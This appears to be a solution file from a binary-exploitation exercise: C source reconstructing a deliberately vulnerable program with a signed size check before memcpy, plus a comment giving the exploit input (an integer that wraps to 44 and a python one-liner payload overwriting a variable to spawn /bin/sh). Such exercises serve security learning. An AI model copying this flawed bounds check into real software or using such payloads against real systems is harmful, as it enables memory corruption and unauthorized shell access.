#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int	main(int argc, char **argv)
{
	char	buff[40];			// [esp+0x14] - 0xffffd1b4

	int n = atoi(argv[1]);			// [esp+0x3c] - 0xffffd1dc
	if (n > 9)
		return (1);
	memcpy(buff, argv[2], n * 4);
	if (n == 0x574f4c46)
		execl("/bin/sh", "sh", 0);
	return (0);
}

/* Need n * 4 to be 44 as a size_t		--> n = -2147483637
 * Need argv[2] to have 40 random bytes, and then 0x574f4c46
 * run -2147483637 $(python -c "print('A' * 40 + '\x46\x4c\x4f\x57')")
*/
